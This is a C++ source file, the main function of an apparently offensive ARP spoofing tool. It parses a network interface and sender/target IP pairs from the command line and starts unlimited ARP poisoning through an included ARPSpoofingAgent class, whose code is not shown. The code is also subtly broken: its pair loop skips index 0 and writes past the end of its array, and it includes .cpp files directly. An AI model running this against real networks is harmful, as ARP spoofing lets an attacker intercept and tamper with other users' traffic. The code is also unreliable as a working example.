#include <iostream>
#include <vector>
#include "network/NetTools.cpp"
#include "network/ARPSpoofingAgent.cpp"


int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "WARNING: failed load network protocol..." << std::endl;
        return 1;
    } else std::cout << "INFO: network interface at " << argv[1] << std::endl;

    std::optional<std::pair<uint8_t*, uint8_t*>*> sessionList;
    if (argc == 2) {
        sessionList.emplace();
    } else {
        int pair_count = argc / 2 - 1;
        auto pairs = new std::pair<uint8_t*, uint8_t*>[pair_count]();
        for (int i = 1; pair_count + 1 > i; i++) {
            auto senderIP = NetTools::strToIP(argv[i*2]);
            auto targetIp = NetTools::strToIP(argv[i*2+1]);
            if (!senderIP or !targetIp) {
                std::cout << "WARNING: invalied session pair : " << argv[i*2] << argv[i*2+1] << std::endl;
                return 1;
            }
            std::cout << "INFO: success add session: " << argv[i*2] << "->" << argv[i*2+1] << std::endl;
            pairs[i] = std::make_pair(senderIP.value(), targetIp.value());
        }
        sessionList.emplace(pairs);
    }

    char* netInterface = argv[1];

    auto arpAttackAgent = ARPSpoofingAgent(netInterface, sessionList);
    arpAttackAgent.buildSessions();
    arpAttackAgent.startARPSpoofing(ARPSpoofingAgent::UNLIMITED);
    return 0;
}
